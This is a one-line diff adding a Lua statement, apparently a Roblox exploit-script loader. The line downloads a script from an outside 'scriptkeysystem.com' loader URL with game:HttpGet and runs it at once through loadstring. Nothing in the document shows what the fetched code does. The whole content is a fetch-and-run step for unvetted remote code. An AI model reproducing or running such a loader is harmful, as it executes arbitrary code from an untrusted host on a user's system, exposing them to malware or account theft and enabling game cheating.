@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptkeysystem.com/loader/50df83afd3f21b8aaed2.lua"))()
